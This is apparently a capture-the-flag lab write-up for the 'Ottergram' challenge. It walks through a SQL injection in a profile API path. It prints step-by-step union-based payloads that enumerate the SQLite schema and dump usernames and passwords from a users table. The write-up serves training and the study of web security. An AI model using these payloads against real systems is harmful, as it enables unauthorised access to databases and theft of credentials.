# Ottergram

Level: Easy\
Points: 10\
Type: Daily Challenge

Lab Interface

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Intersting request

```
GET /api/profile/sushil
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Possible SQLi in path parameter.\
Using simple payload `' or 1=1 -- -` proves this parameter is indeed vulnerable to sqli

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Next step, finding column number. Using union select method, I found the no of column = 7

```
' union select 1,2,3,4,5,6,7 -- -
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Using [PayloadsAllTheThings SQLi Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification), I found the database to be sqlite

Next is dumping the columns name.

```
' union select 1,2,3,4,5,6,group_concat(tbl_name) from sqlite_master -- -
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`users` table looks intersting.

Next step is to get columns name from `users` table.

```
' union select 1,2,3,4,5,6,MAX(sql) from sqlite_master WHERE tbl_name='users' -- -
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Two interesting columns on `users` table are `username` and `password` . Dumping them as

```
' union select 1,2,3,4,5,username,password from users -- -
```

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Got the flag.
